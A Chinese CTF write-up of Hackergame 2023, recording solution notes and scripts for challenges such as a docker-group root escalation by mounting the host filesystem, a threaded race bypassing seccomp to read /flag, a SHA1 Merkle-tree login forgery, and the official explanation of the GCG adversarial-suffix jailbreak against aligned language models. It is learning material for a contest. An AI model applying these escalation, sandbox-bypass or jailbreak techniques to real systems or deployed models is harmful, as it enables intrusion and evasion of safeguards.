---
comment: True
counter: True
---

# Hackergame 2023

!!! abstract
    这次忙里偷闲做的，还耽搁了一些事儿qaq。算是第一次partly完整地参加Hackergame，因为是面向初学者的比赛，题目难度不高更具有趣味性，特此记录一下。
    一些简单的题目可能记录的会比较草率，会重点记录一些印象深刻，差一点完成的题目。对于没思路的题目也结合公开题解记录一下，补充一下相关知识。
    [官方题解](https://github.com/USTC-Hackergame/hackergame2023-writeups)

## Hackergame 启动

签到题，直接改GET请求参数里的Similarity

## 猫咪小测

考验搜索能力，都很好搜，Google一下你就知道

## 更深更暗

遇事不决 F12，随便滚一下就找到了flag（真的，都是运气

## 旅行照片 3.0

还蛮有意思的社工题，还是比较简单的

从日本、学术会议入手，很容易发现会议名称以及地点为东京大学，根据地图验证一下就发现了那家拉面馆。

于是根据要求查一下会议举办日期，以及东京大学诺贝尔物理学奖获得者，很容易解出第一部分的答案。

第二部分刚开始卡了很久，没想到附近走走居然走那么远，还是靠上野站这一个关键地点才发现原来走了那么远，那就很好定位到国立博物馆和上野公园。根据日期和地点能搜到一个酒的展览会，网站里找到Staff招募，第二部分就完成了。

第三部分第一问直接看会议官网的通知即可，第二部分，海报直接上Twitter搜了一下就出来了。关于 3D 动物的话肯定有相关报道，查了一下有猫有狗，试一下就出来了。

## 赛博井字棋

后端没有做位置是否占用检查，所以只要绕过前端检查就能获得胜利。

## 奶奶的睡前 flag 故事

根据题干提到的`Google亲儿子`猜测和Pixels有关，善用搜索发现是Pixels的图像裁剪漏洞，直接将PNG文件的END数据块添加到相应位置，并没有删除被裁剪的数据，所以可以根据型号修改一下长宽并删除相应数据块即可。

网上其实有相应工具可以一把梭。

## 组委会模拟器

终于有一道需要写脚本的题目了（x

直接F12看源码，发现后端是一次性把所有消息都发过来，那就很简单，之间找出满足要求的消息然后发起撤回请求即可。不过不能一次性都撤回，后端有Delay时间要求，可以根据消息内的Delay信息延迟后发送，当然也可以一直发送直到成功即可（主要省力无脑

??? "解题代码（慎用，概率事件，多试几次就好）"
    ```Python
    import requests
    import json
    from time import sleep
    cookies = {
        'session': 'token'
    }
    msg = requests.post('http://202.38.93.111:10021/api/getMessages', cookies=cookies)
    msg = json.loads(msg.text)
    msg = msg['messages']

    def back(idx):
        back = requests.post('http://202.38.93.111:10021/api/deleteMessage', cookies=cookies, json={'id': idx})
        try:
            back = json.loads(back.text)
        except:
            print('err:' + back.text)
        return back

    for id, i in enumerate(msg):
        if 'hack[' in i['text']:
            t=back(id)
            # 这里可以优化一下，不过懒癌犯了
            while(t.get('error')=='检测到时空穿越'):
                t=back(id)
            # print(id, t)
            
    flag = requests.post('http://202.38.93.111:10021/api/getflag', cookies=cookies)
    flag = json.loads(flag.text)
    print(flag)
    ```

## 虫

真是非常巧，之前就刷到过无线电、SSTV相关的知识，这次居然刚好碰上了，不过Windows端那个软件不怎么会用，看到手机端有相应的傻瓜式收发软件（不过是Android，于是拿出了备用机）很轻松获得了结果。

~~不放图了，占仓库空间，等以后搞个图床或SVG~~

## JSON ⊂ YAML?

学习了一下 Yaml，根据Yaml 1.1与1.2的差异，发现Yaml 1.1无法解析形如*1e3*这样的数字，会将其解析为字符串，这样第一小问就解决了。

第二小问根据搜索得到[这个问题](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)可知道Yaml要求键值是唯一的否则会报错，而JSON没有这个要求，这样就解完了。

## Git? Git!

这题非常的easy，直接`git reflog`，再`git reset`就结束了。

## HTTP 集邮册

大致就是不断查文档，这里就直接搬官方题解了
??? "官方题解"
    - 200 OK. 点击就送，代表请求成功。
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n\r\n
        ```
    - 404 Not Found. 修改路径到一个不存在的文件即可。
        ```
        GET /x HTTP/1.1\r\n
        Host: example.com\r\n\r\n
        ```
    - 400 Bad Request. 构造不符合格式的 HTTP 请求即可。
        ```
        GET / aHTTP/1.1\r\n
        Host: example.com\r\n\r\n
        ```
    - 505 HTTP Version Not Supported. 修改 HTTP 版本号到一个离谱的值即可。
        ```
        GET / HTTP/11\r\n
        Host: example.com\r\n\r\n
        ```
    - 405 Method Not Allowed. 修改请求方法到 `POST` 等即可。
        ```
        POST / HTTP/1.1\r\n
        Host: example.com\r\n\r\n
        ```

    接下来是可能需要看文档的部分：

    - 100 Continue. 代表服务器希望客户端继续请求或者忽略。需要客户端发送 `Expect: 100-continue`。
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        Expect: 100-continue\r\n\r\n
        ```
    - 206 Partial Content. 一个 HTTP 请求可以只请求部分内容，服务器也会返回部分内容。
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        Range: bytes=1-2\r\n\r\n
        ```
    - 416 Range Not Satisfiable. 上面的 `Range` 是一个合法的范围，那么不合法的范围呢？就是 416。
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        Range: bytes=114514-1919810\r\n\r\n
        ```
    - 304 Not Modified. 代表文件在指定条件下没有修改过，这里用 `If-Modified-Since`：
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n
        ```
    - 412 Precondition Failed. 这个 payload 使用了 ETag + If-Match，ETag 和对应的 web 资源对应，用来区分对应资源不同的版本。客户端可以利用这个信息来节省带宽。这里 [`If-Match`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Match) 则在尝试匹配这个 ETag，如果不匹配，那就返回 412。
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        If-Match: "bfc13a64729c4290ef5b2c2730249c88ca92d82d"\r\n\r\n
        ```
    - 413 Content Too Large. 不需要真正输入很大的 payload，把 `Content-length` 弄得很大就行：
        ```
        GET / HTTP/1.1\r\n
        Host: example.com\r\n
        Content-length: 1145141919810\r\n\r\n
        ```
    - 414 URI Too Long. 大概需要很长的 URI 路径（但是又不能太长，否则 web 界面本体不会允许这样的响应）。内容详见 [414.txt](./414.txt)。

    以上就已经集满了 12 个。在验题时还有一个 HTTP code 漏了：

    - 501 Not Implemented. 代表服务器不支持此功能。Nginx 源代码中默认配置下唯一可能触发的地方是 <https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008>:

        ```c
        } else {
            ngx_log_error(NGX_LOG_INFO, r->connection->log, 0,
                            "client sent unknown \"Transfer-Encoding\": \"%V\"",
                            &r->headers_in.transfer_encoding->value);
            ngx_http_finalize_request(r, NGX_HTTP_NOT_IMPLEMENTED);
            return NGX_ERROR;
        }
        ```

        `else` 上面只允许 `chunked`，所以可以：

        ```
        GET / HTTP/1.1\r\n
        Transfer-Encoding: gzip\r\n
        Host: example.com\r\n\r\n
        ```

        `gzip` 换成除了 `chunked` 以外的任意字符串都行。

    最后一个问题：没有状态码是怎么回事？

    ```
    GET /\r\n
    ```

    这里实际发送的是 HTTP/0.9 请求，它只支持 `GET`，然后后面直接接 URL，没有别的。然后响应就直接响应文件内容，也没有状态码之类的东西。

## Docker for Everyone

这题考点就是docker用户组与root其实是等价的，因此直接启动一个容器把flag挂载进容器即可在容器内读取。另外注意一下软连接的问题即可。

```
docker run -it --rm -v /:/outside alpine
```

## 惜字如金 2.0

直接暴力穷举即可，其实满足条件的情况很多，直接边跑边输出就很快能拿到flag了。

??? "解题代码（过于暴力）"
    ```Python
    cod_dict = []
    cod_dict += ['nymeh1niwemflcir}echaet']
    cod_dict += ['a3g7}kidgojernoetlsup?h']
    cod_dict += ['ulw!f5soadrhwnrsnstnoeq']
    cod_dict += ['ct{l-findiehaai{oveatas']
    cod_dict += ['ty9kxborszstguyd?!blm-p']

    def get_cod_dict(c_dict):
        return ''.join(c_dict)

    def decrypt_data(input_codes):
        flags = []
        for k in range(23):
            print(k)
            for j in range(23):
                for t in range(23):
                    for p in range(23):
                        for f in range(23):
                            cd_dict = cod_dict.copy()
                            cd_dict[0] = cod_dict[0][:k] + cod_dict[0][k] + cod_dict[0][k:]
                            cd_dict[1] = cod_dict[1][:j] + cod_dict[1][j] + cod_dict[1][j:]
                            cd_dict[2] = cod_dict[2][:t] + cod_dict[2][t] + cod_dict[2][t:]
                            cd_dict[3] = cod_dict[3][:p] + cod_dict[3][p] + cod_dict[3][p:]
                            cd_dict[4] = cod_dict[4][:f] + cod_dict[4][f] + cod_dict[4][f:] 
                            print(cd_dict)
                            st_dict = get_cod_dict(cd_dict)
                            output_chars = [st_dict[c] for c in input_codes]
                            if 'flag{' in ''.join(output_chars):
                                flags.append(''.join(output_chars))
        return flags

    flags = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
                        17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
                        31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
                        25, 63, 77, 36, 5, 32, 60, 67, 113, 28])

    print(set(flags))
    ```

## 🪐 高频率星球

题目中给的是asciinema录像文件，直接`asciinema cat`即可得到字节流，不过会有很多额外不需要的东西，删起来比较麻烦，看到asciinema录制的时候有raw选项，于是重新录了一遍，这样字节流就干净很多，稍微改一下，运行即可。

## 🪐 小型大语言模型星球

很新颖的AI题目，对于我来说只能乱试，第一问直接用repeat大法就可完成。
第二问其实思路对的，不过我嫌麻烦，没有去穷举hhh。

后面两问确实可以的，学习了。

??? "官方题解"
    ### LLM Attacks

    论文：[Universal and Transferable Adversarial Attacks on Aligned Language Models](https://arxiv.org/abs/2307.15043)

    ### Background

    一个 Decoder-Only 的 LLM 将一串 token $x_{1:n}$ 映射到下一个 token $x_{n+1}$。语言模型所需要学习的则是在给定之前的 token $x_{1:n}$ ，得到下一个 token $x_{n+1}$ 的概率 $p(x_{n+1} | x_{1:n})$。其中每一个 $x_i \in {1, ... V}$ 都是词表中的一个 token。如果想要让模型输入一段序列，序列中每一个 token 都只与之前的所有 token 有关，因此模型输出一段序列 $x_{n+1:n+H}$ 的概率为

    $$p(x_{n+1:n+H}|x_{1:n}) = \prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})$$

    ### Method

    如果我们希望模型能够输出一个指定的序列，就是希望 $p(x_{n+1:n+H}|x_{1:n})$ 尽可能高，以此出发，我们可以得到优化目标

    $$\mathcal{L}(x_{1:n}) = -\log p(x^\star_{n+1:n+H} | x_{1:n})$$

    但是与常见的图片上面的对抗样本攻击不同，LLM 的输入是相对离散的 token，无法进行连续的变化。因此作者根据 AutoPrompt [1]，设计了 Greedy Coordinate Gradient 来尽可能高效地对离散的输入进行优化。

    通俗来讲，我们希望能够将原有输入的 Prompt 中的某一些 token 替换为新的 token，并且让替换之后尽可能让输出的 target loss 尽可能降低。

    作者用一个长度为 $V$ 的 one hot 向量来代表当前位置的 token，该 one hot 向量与 embedding layer（大小为 $R^{\mathrm{dim} \times V}$）相乘后可以得到该 token 对应的 embedding，该 embedding 被输入给了模型。在反向传播后，one hot 向量的每一个位置 $i$ 都有对应的梯度 $\mathrm{grad}_i$， $\mathrm{grad}_i < 0$ 说明如果将原本的 token 替换为词表中的第 $i$ 个 token，能够使得输出的 loss 下降。

    基于这个梯度，我们选出了 top-k 个最小的替换 token（算法的第 4 行）。然后我们随机选择 prompt 的 token 的位置，将其随机替换为梯度最小的 k 个之一。重复上述替换多次，选择出替换后 loss 最小的 prompt 作为下一次迭代的初始值。

    [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980


## 🪐 流式星球

需要知道图像的长宽，怎么办呢？手动plot出来看呗，反正试一下很容易找到周期性重复的东西，然后微调一下得到长宽，直接输出视频即可。

??? 解题代码
    ```Python
    import cv2
    import numpy as np

    def restore_video(buffer, output):
        frame_width = 427
        frame_height = 759
        frame_count = 139
        video_writer = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"mp4v"), 30.0, (frame_width, frame_height))
        
        for i in range(frame_count):
            frame = buffer[i].astype(np.uint8)
            video_writer.write(frame)
        video_writer.release()


    if __name__ == "__main__":
        with open("video.bin", "rb") as input_file:
            buffer = np.fromfile(input_file, dtype=np.uint8)
        print(buffer.shape)
        num = [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35, 38, 41, 44, 47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80, 83, 86, 89, 92, 95, 98]
        nums = []
        f = np.append(buffer, np.zeros(93, dtype=np.uint8))
        f=f.reshape((-1, 759, 427, 3))
        restore_video(f, "video.mp4")
    ```

## 🪐 低带宽星球

这一题第一问没什么问题，随便压缩一下就能过。第二题有点折磨，思路是对的，去找`libvips`支持的图像格式，就是我太懒了没去仔细翻，一个劲地琢磨SVG去了，导致没做出来，很可惜。这道题用JXL的格式来解的。

## Komm, süsser Flagge

这道题就是对TCP/IP数据包的修改，第一问直接一个字节一个字节发送即可绕过，第二问其实非预期了，因为一个字节没有到u32的要求，直接绕过了hhh。

第三问思路其实对了，就是修改TCP中的OPTION部分，不过当时很忙，用python写的有点奇怪，没细调，如果空闲的话应该做出来没问题。

## 为什么要打开 /flag 😡

第一问很easy直接静态编译后提交即可。第二问看了官方题解之后，知道要多看注释，用线程的方式来绕过seccomp，学习了。

??? "官方题解"
    ```C
    #include <stdio.h>
    #include <pthread.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <time.h>

    char flagfile[] = "/flag";

    void *read_file() {
        char buf[100] = {};
        while (1) {
            int f = open(flagfile, O_RDONLY);
            if (!f) {
                continue;
            }
            read(f, buf, 99);
            if (buf[0] && buf[0] != 'I') {
                printf("%s\n", buf);
                exit(0);
            }
            close(f);
        }
    }

    void *modify() {
        struct timespec req;
        req.tv_sec = 0;
        req.tv_nsec = 50;
        while (1) {
            flagfile[1] = 'a';
            // sleep is not allowed. So just don't sleep.
            // nanosleep(&req, NULL);
            flagfile[1] = 'f';
        }
    }

    int main() {
        printf("pthread\n");
        pthread_t t1, t2;
        pthread_create(&t1, NULL, read_file, NULL);
        pthread_create(&t2, NULL, modify, NULL);

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        printf("done?\n");
        return 0;
    }
    ```

## 异星歧途

很好玩的小游戏，就当放松一下，逻辑很简单（小心爆炸，第一次忘记先通冷却液了

## 微积分计算小练习 2.0

这道题很烦，就是感觉自己快做出来了，就差一点点，所以需要总结一下经验教训。

其实也没什么好总结的，就是没注意到`updateElement`，导致不知道怎么绕过长度限制。也是自己菜，其实没怎么做过XSS的题目，还是需要积累经验，感觉好的XSS题目不多。

## 逆向工程不需要 F5

这道题记录一下，因为逆向的题目做得少，所以需要积累一下。

??? "官方题解中需要记录的习惯"
    ```Python
    import angr, monkeyhex, claripy
    proj = angr.Project('no_need_for_F5/main.exe')
    flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(32)]
    flag = claripy.Concat(*[claripy.BVV(b'flag{')]+flag_chars+[claripy.BVV(b'}\x00')])
    state = proj.factory.call_state(0x140001000)
    input_addr = 0

    @proj.hook(0x140001093, length=5)
    def get_input(state):
        global input_addr
        input_addr = state.regs.rdx
        state.memory.store(input_addr,flag)
        print('Input done')

    @proj.hook(0x140001079, length=5)
    def printf(state):
        return

    simgr = proj.factory.simgr(state)
    simgr.explore(find=0x1400013A1, avoid=0x1400013B7)
    simgr.found[0].solver.eval(flag).to_bytes(39,"big")
    ```

## O(1) 用户登录系统

根据哈希书的特性，因此我们只需要构造一个用户，使得它的SHA1值等价于其子节点存在admin用户即可。这里注意需要SHA1值能够被UTF-8解码即可。

这里我先找了如下两个用户：

```
admin:aaaadcLd
admin:aaaaanRH
```

这里其实可以随便搜索，下面都代码改一下都可以搜，随便搜。

??? "搜索合适的admin用户"
    ```Python
    from itertools import product
    str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    prefix = 'admin:'

    for i in product(str1, repeat=8):
        user = prefix + ''.join(i)
        x = f(user.encode())
        # x = com(x, x)
        if b':' not in x:
            try:
                x.decode()
                print(user, x)
            except:
                pass  
    ```
然后就算一下SHA1后拼接即可，解题脚本如下：

??? "解题脚本（修改版，原版太杂乱了）"
    ```Python
    from hashlib import sha1
    from pwn import *

    f = lambda data: sha1(data)
    def com(x,y):
        if isinstance(x, bytes):
            t = x
        else:
            t = x.digest()
        if isinstance(y, bytes):
            p = y
        else:
            p = y.digest()
        if t>p: t,p=p,t
        return t+p

    if __name__ == '__main__':
        p = remote('202.38.93.111', 10094)
        token = b'2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug='

        p.recvuntil('token:')
        p.sendline(token)
        p.recvuntil('Choice:')
        p.sendline(b'1')

        def sendu(data):
            p.recvuntil('>')
            p.sendline(data)

        test0 = [b'admin:aaaadcLd', b'admin:aaaaanRH']
        test1 = b'a:a'
        test3 = com(f(test0[0]), f(test0[1]))
        
        sendu(test1)
        sendu(test3)

        sendu(b'EOF')
        p.recvuntil('Choice:')
        p.sendline(b'2')
        p.recvuntil('Login credential: ')
        p.sendline(test0[0].decode()+':'+f(test0[1]).hexdigest()+sha1(test1).hexdigest())
        p.interactive()
    ```
## 其他

后面的题目其实没怎么看，就暂时先不写了，等以后有时间空了研究后再记录一下吧。